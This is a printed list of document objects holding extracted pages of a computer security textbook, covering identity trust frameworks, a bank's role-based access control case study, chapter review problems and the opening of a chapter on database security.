       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 159, 'page_label': '158'}, page_content='158  CHAPTER 4 / ACCEss ConTRol\\n 4.8 TRUST FRAMEWORKS\\nThe interrelated concepts of trust, identity, and attributes have become core concerns \\nof Internet businesses, network service providers, and large enterprises. These concerns \\ncan clearly be seen in the e-commerce setting. For efficiency, privacy, and legal simplic-\\nity,\\xa0parties to transactions generally apply the need-to-know principle: What do you need \\nto know about someone in order to deal with them? The answer varies from case to case, \\nand includes such attributes as professional registration or license number, organization \\nand department, staff ID, security clearance, customer reference number, credit card \\nnumber, unique health identifier, allergies, blood type, Social Security number, address, \\ncitizenship status, social networking handle, pseudonym, and so on. The attributes of an \\nindividual that must be known and verified to permit a transaction depend on context.\\nThe same concern for attributes is increasingly important for all types of access \\ncontrol situations, not just the e-business context. For example, an enterprise may \\nneed to provide access to resources for customers, users, suppliers, and partners. \\nDepending on context, access will be determined not just by identity, but by the \\nattributes of the requestor and the resource.\\nTraditional Identity Exchange Approach\\nOnline or network transactions involving parties from different organizations, or \\nbetween an organization and an individual user such as an online customer, gener -\\nally require the sharing of identity information. This information may include a host \\nof associated attributes in addition to a simple name or numerical identifier. Both \\nthe party disclosing the information and the party receiving the information need \\nto have a level of trust about security and privacy issues related to that information.\\nFigure 4.13a shows the traditional technique for the exchange of identity infor-\\nmation. This involves users developing arrangements with an identity service  provider \\nto procure digital identity and credentials, and arrangements with parties that provide \\nend-user services and applications and that are willing to rely on the identity and \\ncredential information generated by the identity service provider.\\nThe arrangement of Figure 4.13a must meet a number of requirements. The \\n relying party requires that the user has been authenticated to some degree of assur-\\nance, that the attributes imputed to the user by the identity service provider are accu-\\nrate, and that the identity service provider is authoritative for those attributes. The \\nidentity service provider requires assurance that it has accurate information about the \\nuser and that, if it shares information, the relying party will use it in accordance with \\ncontractual terms and conditions and the law. The user requires assurance that the \\nidentity service provider and relying party can be entrusted with sensitive information \\nand that they will abide by the user’s preferences and respect the user’s privacy. Most \\nimportantly, all the parties want to know if the practices described by the other par-\\nties are actually those implemented by the parties, and how reliable those parties are.\\nOpen Identity Trust Framework\\nWithout some universal standard and framework, the arrangement of Figure 4.13a must \\nbe replicated in multiple contexts. A far preferable approach is to develop an open, \\nM04_STAL0611_04_GE_C04.indd   158 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 160, 'page_label': '159'}, page_content='4.8 / TRUsT FRAMEWoRKs  159\\nstandardized approach to trustworthy identity and attribute exchange. In the remain-\\nder of this section, we examine such an approach that is gaining increasing acceptance.\\nUnfortunately, this topic is burdened with numerous acronyms, so it is best to \\nbegin with a definition of the most important of these:\\n• OpenID: This is an open standard that allows users to be authenticated by \\ncertain cooperating sites (known as Relying Parties) using a third party service, \\neliminating the need for Webmasters to provide their own ad hoc systems and \\nallowing users to consolidate their digital identities. Users may create accounts \\nwith their preferred OpenID identity providers, then use those accounts as the \\nbasis for signing on to any Web site that accepts OpenID authentication.\\nFigure 4.13 Identity Information Exchange Approaches\\n(a) Traditional triangle of parties involved in an exchange of identity information\\n(b) Identity attribute exchange elements\\n(Possible contract)\\nTerms of service\\n(TOS) agreement\\nTerms of service(TOS) agreement\\nIdentity\\nservice\\nprovider\\nIdentity\\nservice\\nproviders\\nRelying\\nparty\\nRelying\\nparties\\nUsers\\nUsers\\nTrust framework\\nproviders\\nAssessors\\n& auditors\\nDispute\\nresolvers\\nAttribute providers\\nAttribute exchange\\nnetwork\\nM04_STAL0611_04_GE_C04.indd   159 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 161, 'page_label': '160'}, page_content='160  CHAPTER 4 / ACCEss ConTRol\\n• OIDF: The OpenID Foundation is an international nonprofit organization of \\nindividuals and companies committed to enabling, promoting, and protecting \\nOpenID technologies. OIDF assists the community by providing needed infra-\\nstructure and help in promoting and supporting expanded adoption of OpenID.\\n• ICF: The Information Card Foundation is a nonprofit community of companies \\nand individuals working together to evolve the Information Card ecosystem. \\nInformation Cards are personal digital identities people can use online, and the \\nkey component of identity metasystems. Visually, each Information Card has \\na card-shaped picture and a card name associated with it that enable people \\nto organize their digital identities and to easily select one they want to use for \\nany given interaction.\\n• OITF: The Open Identity Trust Framework is a standardized, open specification \\nof a trust framework for identity and attribute exchange, developed jointly by \\nOIDF and ICF.\\n• OIX: The Open Identity Exchange Corporation is an independent, neutral, \\ninternational provider of certification trust frameworks conforming to the \\nOpen Identity Trust Frameworks model.\\n• AXN: An Attribute Exchange Network (AXN) is an online Internet-scale \\ngateway for identity service providers and relying parties to efficiently access \\n user-asserted, permissioned, and verified online identity attributes in high \\n volumes at affordable costs.\\nSystem managers need to be able to trust that the attributes associated with a \\nsubject or an object are authoritative and are exchanged securely. One approach to \\nproviding that trust within an organization is the ICAM model, specifically the ICAM \\ncomponents (see Figure 4.12). Combined with an identity federation functionality \\nthat is shared with other organizations, attributes can be exchanged in a trust-worthy \\nfashion, supporting secure access control.\\nIn digital identity systems, a trust framework functions as a certification program. \\nIt enables a party who accepts a digital identity credential (called the relying party) to \\ntrust the identity, security, and privacy policies of the party who issues the credential \\n(called the identity service provider) and vice versa. More formally, OIX defines a \\ntrust framework as a set of verifiable commitments from each of the various par -\\nties in a transaction to their counter parties. These commitments include (1)\\xa0controls \\n(including regulatory and contractual obligations) to help ensure commitments are \\ndelivered and (2) remedies for failure to meet such commitments. A\\xa0trust framework \\nis developed by a community whose members have similar goals and perspectives. It \\ndefines the rights and responsibilities of that community’s participants; specifies the \\npolicies and standards specific to the community; and defines the community-specific \\nprocesses and procedures that provide assurance. Different trust frameworks can exist, \\nand sets of participants can tailor trust frameworks to meet their particular needs.\\nFigure 4. 13b shows the elements involved in the OITF. Within any given \\n organization or agency, the following roles are part of the overall framework:\\n• Relying parties (RPs): Also called service providers, these are entities deliver-\\ning services to specific users. RPs must have confidence in the identities and/or \\nM04_STAL0611_04_GE_C04.indd   160 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 162, 'page_label': '161'}, page_content='4.8 / TRUsT FRAMEWoRKs  161\\nattributes of their intended users, and must rely upon the various credentials \\npresented to evince those attributes and identities.\\n• Subjects: These are users of an RP’s services, including customers, employees, \\ntrading partners, and subscribers.\\n• Attribute providers (APs): APs are entities acknowledged by the community \\nof interest as being able to verify given attributes as presented by subjects and \\nwhich are equipped through the AXN to create conformant attribute creden -\\ntials according to the rules and agreements of the AXN. Some APs will be \\nsources of authority for certain information; more commonly APs will be bro-\\nkers of derived attributes.\\n• Identity providers (IDPs): These are entities able to authenticate user creden-\\ntials and to vouch for the names (or pseudonyms or handles) of subjects, and \\nwhich are equipped through the AXN or some other compatible Identity and \\nAccess Management (IDAM) system to create digital identities that may be \\nused to index user attributes.\\nThere are also the following important support elements as part on an AXN:\\n• Assessors: Assessors evaluate identity service providers and RPs and certify \\nthat they are capable of following the OITF provider’s blueprint.\\n• Auditors: These entities may be called on to check that parties’ practices have \\nbeen in line with what was agreed for the OITF.\\n• Dispute resolv ers: These entities provide arbitration and dispute resolution \\nunder OIX guidelines.\\n• Trust framework providers: A trust framework provider is an organization that \\ntranslates the requirements of policymakers into an own blueprint for a trust \\nframework that it then proceeds to build, doing so in a way that is consistent \\nwith the minimum requirements set out in the OITF specification. In almost all \\ncases, there will be a reasonably obvious candidate organization to take on this \\nrole, for each industry sector or large organization that decides it is appropriate \\nto interoperate with an AXN.\\nThe solid arrowed lines in Figure 4.13b indicate agreements with the trust \\nframework provider for implementing technical, operations, and legal require -\\nments. The dashed arrowed lines indicate other agreements potentially affected by \\nthese requirements. In general terms, the model illustrated in Figure 4.13b would \\noperate in the following way. Responsible persons within participating organiza -\\ntions determine the technical, operational, and legal requirements for exchanges \\nof identity information that fall under their authority. They then select OITF \\nproviders to implement these requirements. These OITF providers translate the \\nrequirements into a blueprint for a trust framework that may include additional \\nconditions of the OITF provider. The OITF provider vets identity service provid -\\ners and RPs and contracts with them to follow its trust framework requirements \\nwhen conducting exchanges of identity information. The contracts carry provi -\\nsions relating to dispute resolvers, and auditors for contract interpretation and \\nenforcement.\\nM04_STAL0611_04_GE_C04.indd   161 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 163, 'page_label': '162'}, page_content='162  CHAPTER 4 / ACCEss ConTRol\\n 4.9 CASE STUDY: RBAC SYSTEM FOR A BANK\\nThe Dresdner Bank has implemented an RBAC system that serves as a useful prac-\\ntical example [SCHA01]. The bank uses a variety of computer applications. Many \\nof these were initially developed for a mainframe environment; some of these older \\napplications are now supported on a client-server network, while others remain on \\nmainframes. There are also newer applications on servers. Prior to 1990, a simple \\nDAC system was used on each server and mainframe. Administrators maintained a \\nlocal access control file on each host and defined the access rights for each employee \\non each application on each host. This system was cumbersome, time-consuming, and \\nerror-prone. To improve the system, the bank introduced an RBAC scheme, which \\nis systemwide and in which the determination of access rights is compartmentalized \\ninto three different administrative units for greater security.\\nRoles within the organization are defined by a combination of official posi -\\ntion and job function. Table 4.5a provides examples. This differs somewhat from the \\nconcept of role in the NIST standard, in which a role is defined by a job function. To \\nsome extent, the difference is a matter of terminology. In any case, the bank’s role \\nstructuring leads to a natural means of developing an inheritance hierarchy based \\non official position. Within the bank, there is a strict partial ordering of official posi-\\ntions within each organization, reflecting a hierarchy of responsibility and power. For \\nexample, the positions Head of Division, Group Manager, and Clerk are in descend-\\ning order. When the official position is combined with job function, there is a resulting \\nordering of access rights, as indicated in Table 4.5b. Thus, the financial analyst/Group \\nManager role (role B) has more access rights than the financial analyst/Clerk role \\n(role A). The table indicates that role B has as many or more access rights than role \\nA in three applications and has access rights to a fourth application. On the other \\nhand, there is no hierarchical relationship between office banking/Group Manager \\nand financial analyst/Clerk because they work in different functional areas. We can \\ntherefore define a role hierarchy in which one role is superior to another if its position \\nis superior and their functions are identical. The role hierarchy makes it possible to \\neconomize on access rights definitions, as suggested in Table 4.5c.\\nIn the original scheme, the direct assignment of access rights to the individual \\nuser occurred at the application level and was associated with the individual applica-\\ntion. In the new scheme, an application administration determines the set of access \\nrights associated with each individual application. However, a given user perform -\\ning a given task may not be permitted all of the access rights associated with the \\napplication. When a user invokes an application, the application grants access on the \\nbasis of a centrally provided security profile. A separate authorization administration \\nassociated access rights with roles, and creates the security profile for a use on the \\nbasis of the user’s role.\\nA user is statically assigned a role. In principle (in this example), each user may \\nbe statically assigned up to four roles and select a given role for use in invoking a par-\\nticular application. This corresponds to the NIST concept of session. In practice, most \\nusers are statically assigned a single role based on the user’s position and job function.\\nAll of these ingredients are depicted in Figure 4.14. The Human Resource \\nDepartment assigns a unique User ID to each employee who will be using the system. \\nM04_STAL0611_04_GE_C04.indd   162 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 164, 'page_label': '163'}, page_content='4.9 / CAsE sTUDY: RBAC sYsTEM FoR A BAnK  163\\n(a) Functions and Official Positions\\nRole Function Official Position\\nA financial analyst Clerk\\nB financial analyst Group Manager\\nC financial analyst Head of Division\\nD financial analyst Junior\\nE financial analyst Senior\\nF financial analyst Specialist\\nG financial analyst Assistant\\n\\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0\\nX share technician Clerk\\nY support e-commerce Junior\\nZ office banking Head of Division\\nTable 4.5 Functions and Roles for Banking Example\\n(b) Permission Assignments\\nRole Application Access Right\\nA\\nmoney market \\ninstruments\\n1, 2, 3, 4\\nderivatives \\ntrading\\n1, 2, 3, 7 , 10, 12\\ninterest \\ninstruments\\n1, 4, 8, 12, 14, 16\\nB\\nmoney market \\ninstruments\\n1, 2, 3, 4, 7\\nderivatives \\ntrading\\n1, 2, 3, 7 , 10, 12, 14\\ninterest \\ninstruments\\n1, 4, 8, 12, 14, 16\\nprivate consumer \\ninstruments\\n1, 2, 4, 7\\n\\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0\\n(c) Permission Assignment with Inheritance\\nRole Application Access Right\\nA\\nmoney market \\ninstruments\\n1, 2, 3, 4\\nderivatives  \\ntrading\\n1, 2, 3, 7 , 10, 12\\ninterest \\ninstruments\\n1, 4, 8, 12, 14, 16\\nB\\nmoney market \\ninstruments\\n7\\nderivatives  \\ntrading\\n14\\nprivate  \\nconsumer \\ninstruments\\n1, 2, 4, 7\\n\\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0 \\xa0.\\xa0.\\xa0.\\xa0\\nBased on the user’s position and job function, the department also assigns one or \\nmore roles to the user. The user/role information is provided to the Authorization \\nAdministration, which creates a security profile for each user that associates the \\nUser ID and role with a set of access rights. When a user invokes an application, the \\napplication consults the security profile for that user to determine what subset of the \\napplication’s access rights are in force for this user in this role.\\nA role may be used to access several applications. Thus, the set of access rights \\nassociated with a role may include access rights that are not associated with one of \\nM04_STAL0611_04_GE_C04.indd   163 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 165, 'page_label': '164'}, page_content='164  CHAPTER 4 / ACCEss ConTRol\\nFigure 4.14 Example of Access Control Administration\\nApplication Administration\\nAuthorization Administration\\nHuman Resources Department\\nN M\\nN M\\nFunctions\\nPositions\\nUser\\nIDs\\nAssigns\\nApplication Access\\nright\\nRole Application\\nRoles\\n1 1– 4\\nthe applications the user invokes. This is illustrated in Table 4.5b. Role A has numer-\\nous access rights, but only a subset of those rights are applicable to each of the three \\napplications that role A may invoke.\\nSome figures about this system are of interest. Within the bank, there are 65 \\nofficial positions, ranging from a Clerk in a branch, through the Branch Manager, to a \\nMember of the Board. These positions are combined with 368 different job functions \\nprovided by the human resources database. Potentially, there are 23,920 different \\nroles, but the number of roles in current use is about 1,300. This is in line with the \\nexperience other RBAC implementations. On average, 42,000 security profiles are \\ndistributed to applications each day by the Authorization Administration module.\\n 4.10 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\naccess control\\naccess control list\\naccess management\\naccess matrix\\naccess right\\nattribute\\nattribute-based access control \\n(ABAC)\\nAttribute Exchange Network \\n(AXN)\\nattribute provider\\nauditor\\nauthorizations\\nassessor\\ncapability ticket\\ncardinality\\nclosed access control policy\\ncredential\\nM04_STAL0611_04_GE_C04.indd   164 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 166, 'page_label': '165'}, page_content='4.10 / KEY TERMs, REVIEW QUEsTIons, AnD PRoBlEMs  165\\nReview Questions\\n 4.1 What is the difference between authentication and authorization?\\n 4.2 How does RBAC relate to DAC and MAC?\\n 4.3 List and define the three classes of subject in an access control system.\\n 4.4 List and briefly explain the three basic elements of access control.\\n 4.5 What is ABAC?\\n 4.6 What is the difference between an access control list and a capability ticket?\\n 4.7 List some of the main types of access control.\\n 4.8 Briefly define the four RBAC models of Figure 4.8a.\\n 4.9 What is meant by mutually exclusive roles in the RBAC3 model?\\n 4.10 Describe three types of role hierarchy constraints.\\n 4.11 In the NIST RBAC model, what is the difference between SSD and DSD?\\nProblems\\n 4.1 For the DAC model discussed in Section 4.3, an alternative representation of the pro-\\ntection state is a directed graph. Each subject and each object in the protection state \\nis represented by a node (a single node is used for an entity that is both subject and \\nobject). A directed line from a subject to an object indicates an access right, and the \\nlabel on the link defines the access right.\\na. Draw a directed graph that corresponds to the access matrix of Figure 4.2a.\\nb. Draw a directed graph that corresponds to the access matrix of Figure 4.3.\\nc. Is there a one-to-one correspondence between the directed graph representation \\nand the access matrix representation? Explain.\\ncredential management\\ndiscretionary access control \\n(DAC)\\ndispute resolver\\ndynamic separation of duty \\n(DSD)\\nentitlements\\nenvironment attribute\\ngeneral role hierarchy\\ngroup\\nidentity\\nidentity, credential, and access \\nmanagement (ICAM)\\nidentity federation\\nidentity management\\nidentity provider\\nInformation Card Foundation \\n(ICF)\\nkernel mode\\nleast privilege\\nlimited role hierarchy\\nmandatory access control \\n(MAC)\\nmutually exclusive roles\\nobject\\nobject attribute\\nopen access control policy\\nOpen Identity Exchange \\n Corporation (OIX)\\nOpen Identity Trust \\n Framework (OITF)\\nOpenID\\nOpenID Foundation (OIDF)\\nowner\\npermission\\npolicy\\nprerequisite role\\nprivilege\\nprotection domain\\nrelying part\\nresource\\nrights\\nrole-based access control \\n(RBAC)\\nrole constraints\\nrole hierarchies\\nseparation of duty\\nsession\\nstatic separation of duty (SSD)\\nsubject\\nsubject attribute\\ntrust framework\\ntrust framework provider\\nuser mode\\nM04_STAL0611_04_GE_C04.indd   165 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 167, 'page_label': '166'}, page_content='166  CHAPTER 4 / ACCEss ConTRol\\n 4.2 a. Explain, with an appropriate example, how protection domains provide flexibility.\\nb. How is the concept of protection domains related to operating systems? Explain \\nby quoting an example from the UNIX operating system.\\n 4.3 The VAX/VMS operating system makes use of four processor access modes to \\n facilitate the protection and sharing of system resources among processes. The access \\nmode determines:\\n• Instruction execution privileges: What instructions the processor may execute\\n• Memory access privileges: Which locations in virtual memory the current instruction \\nmay access\\nThe four modes are as follows:\\n• Kernel: Executes the kernel of the VMS operating system, which includes memory \\n management, interrupt handling, and I/O operations\\n• Executive: Executes many of the operating system service calls, including file and \\nrecord\\xa0(disk and tape) management routines\\n• Supervisor: Executes other operating system services, such as responses to user \\ncommands\\n• User: Executes user programs, plus utilities such as compilers, editors, linkers, and \\ndebuggers\\nA process executing in a less-privileged mode often needs to call a procedure that \\nexecutes in a more-privileged mode; for example, a user program requires an oper -\\nating system service. This call is achieved by using a change-mode (CHM) instruc -\\ntion, which causes an interrupt that transfers control to a routine at the new access \\nmode. A return is made by executing the REI (return from exception or interrupt) \\ninstruction.\\na. A number of operating systems ha ve two modes: kernel and user. What are the \\nadvantages and disadvantages of providing four modes instead of two?\\nb. Can you make a case for even more than four modes?\\n 4.4 The VMS scheme discussed in the preceding problem is often referred to as a ring pro-\\ntection structure, as illustrated in Figure 4.15. Indeed, the simple kernel/user scheme is \\na two-ring structure. A disadvantage of a ring-structured access control system is that \\nit violates the principle of least privilege. For example if we wish to have an object \\naccessible in ring X but not ring Y, this requires that X 6 Y. Under this arrangement \\nall objects accessible in ring X are also accessible in ring Y.\\na. Explain in more detail what the problem is and why least privilege is violated.\\nb. Suggest a way that a ring-structured operating system can deal with this problem.\\n 4.5 UNIX treats file directories in the same fashion as files; that is, both are defined by the \\nsame type of data structure, called an inode. As with files, directories include a nine-\\nbit protection string. If care is not taken, this can create access control problems. For \\nexample, consider a file with protection mode 644 (octal) contained in a directory with \\nprotection mode 730. How might the file be compromised in this case?\\n 4.6 In the traditional UNIX file access model,  which we describe in Section 4.4, UNIX \\nsystems provide a default setting for newly created files and directories, which the \\nowner may later change. The default is typically full access for the owner combined \\nwith one of the following: no access for group and other, read/execute access for group \\nand none for other, or read/execute access for both group and other. Briefly discuss \\nthe advantages and disadvantages of each of these cases, including an example of a \\ntype of organization where each would be appropriate.\\n 4.7 Consider user accounts on a system with a Web server configured to provide access to \\nuser Web areas. In general, this uses a standard directory name, such as ‘public_html,’ \\nin a user’s home directory. This acts as their user Web area if it exists. However, to \\nallow the Web server to access the pages in this directory, it must have at least search \\n(execute) access to the user’s home directory, read/execute access to the Web directory, \\nand read access to any webpages in it. Consider the interaction of this requirement \\nM04_STAL0611_04_GE_C04.indd   166 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 168, 'page_label': '167'}, page_content='4.10 / KEY TERMs, REVIEW QUEsTIons, AnD PRoBlEMs  167\\nwith the cases you discussed for the preceding problem. What consequences does this \\nrequirement have? Note a Web server typically executes as a special user, and in a \\ngroup that is not shared with most users on the system. Are there some circumstances \\nwhen running such a Web service is simply not appropriate? Explain.\\n 4.8 Assume an application requires access control policies based on the applicant’s age \\nand the type of funding to be provided. Using an ABAC approach, write policy rules \\nfor each of the following scenarios:\\na. If the applicant’s age is mor e than 35, only “Research Grants (RG)” can be \\nprovided.\\nb. If the applicant’s age is less than or equal to 35, both “RG and Travel Grants (TG)” \\ncan be provided.\\n 4.9 Assume a system with K subject attributes, M object attributes and Range () denotes \\nthe range of possible values that each attribute can take. What are the number of \\nroles and permissions required for an RBAC model? What is the problem with this \\napproach if additional attributes are added?\\n 4.10 For the NIST RBAC standard, we can define the general role hierarchy as follows:\\nRH /uni2286ROLES * ROLES is a partial order on ROLES called the inheritance rela -\\ntion, written as Ú, where r1 Ú r2 only if all permissions of r2 are also permissions of \\nr1, and all users of r1 are also users of r2. Define the set authorized_permissions(ri) to \\nbe the set of all permissions associated with role ri. Define the set authorized_users(ri) \\nto be the set of all users assigned to role ri. Finally, node r1 is represented as an imme-\\ndiate descendant of r2 by r1 W r2, if r1 Ú r2, but no role in the role hierarchy lies \\nbetween r1 and r2.\\na. Using the preceding definitions, as needed, provide a formal definition of the gen-\\neral role hierarchy.\\nb. Provide a formal definition of a limited role hierarchy.\\nFigure 4.15 VAX/VMS Access Modes\\nKernel\\nREI\\nCHMx\\nExecutive\\nSupervisor\\nUser\\nM04_STAL0611_04_GE_C04.indd   167 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 169, 'page_label': '168'}, page_content='168  CHAPTER 4 / ACCEss ConTRol\\n 4.11 In the example of Section 4.9, use the notation Role(x). Position and Role(x). Function \\nto denote the position and the function associated with role x.\\na. We can define the r ole hierarchy for this example as one in which one role is \\nsuperior to another if its position and functions are both superior. Express this \\nrelationship formally.\\nb. An alternative role hierarchy is one in which a role is equal to another if its posi -\\ntion is equal, regardless of the function. Express this relationship formally.\\n 4.12 In the example of the online entertainment store in Section 4.6, with the finer-grained \\npolicy that includes premium and regular users, describe the ABAC policy rules for \\naccessing a movie, and list all the advantages of an ABAC control policy.\\nM04_STAL0611_04_GE_C04.indd   168 10/11/17   2:47 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 170, 'page_label': '169'}, page_content='169\\n5.1 The Need for Database Security\\n5.2 Database Management Systems\\n5.3 Relational Databases\\nElements of a Relational Database System\\nStructured Query Language\\n5.4 SQL Injection Attacks\\nA Typical SQLi Attack\\nThe Injection Technique\\nSQLi Attack Avenues and Types\\nSQLi Countermeasures\\n5.5 Database Access Control\\nSQL-Based Access Definition\\nCascading Authorizations\\nRole-Based Access Control\\n5.6 Inference\\n5.7 Database Encryption\\n5.8 Data Center Security\\nData Center Elements\\nData Center Security Considerations\\nTIA-492\\n5.9 Key Terms, Review Questions, and Problems\\nDatabase and Data Center \\nSecurity\\nCHAPTER \\n \\nM05_STAL0611_04_GE_C05.indd   169 10/11/17   2:49 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 171, 'page_label': '170'}, page_content='170  CHAPTER 5 / DATAbASE AnD DATA CEnTER SECuRiTy\\nThis chapter looks at the unique security issues that relate to databases. The focus \\nof this chapter is on relational database management systems (RDBMS). The rela -\\ntional approach dominates industry, government, and research sectors, and is likely \\nto do so for the foreseeable future. We begin with an overview of the need for data-\\nbase-specific security techniques. Then we provide a brief introduction to database \\n management systems, followed by an overview of relational databases. Next, we look \\nat the issue of database access control, followed by a discussion of the inference \\nthreat. Then, we examine database encryption. Finally, we will examine the security \\nissues related to the deployment of large data centers.\\n 5.1 THE NEED FOR DATABASE SECURITY\\nOrganizational databases tend to concentrate sensitive information in a single logical \\nsystem. Examples include:\\n• Corporate financial data\\n• Confidential phone records\\n• Customer and employee information, such as name , Social Security number, \\nbank account information, and credit card information\\n• Proprietary product information\\n• Health care information and medical records\\nFor many businesses and other organizations, it is important to be able to pro-\\nvide customers, partners, and employees with access to this information. But such \\ninformation can be targeted by internal and external threats of misuse or unauthor-\\nized change. Accordingly, security specifically tailored to databases is an increasingly \\nimportant component of an overall organizational security strategy.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Understand the unique need for database security, separate from ordinary \\ncomputer security measures.\\n ◆ Present an overview of the basic elements of a database management  \\nsystem.\\n ◆ Present an overview of the basic elements of a relational database system.\\n ◆ Define and explain SQL injection attacks.\\n ◆ Compare and contrast different approaches to database access control.\\n ◆ Explain how inference poses a security threat in database systems.\\n ◆ Discuss the use of encryption in a database system.\\n ◆ Discuss security issues related to data centers.\\nM05_STAL0611_04_GE_C05.indd   170 10/11/17   2:49 PM'),\n",
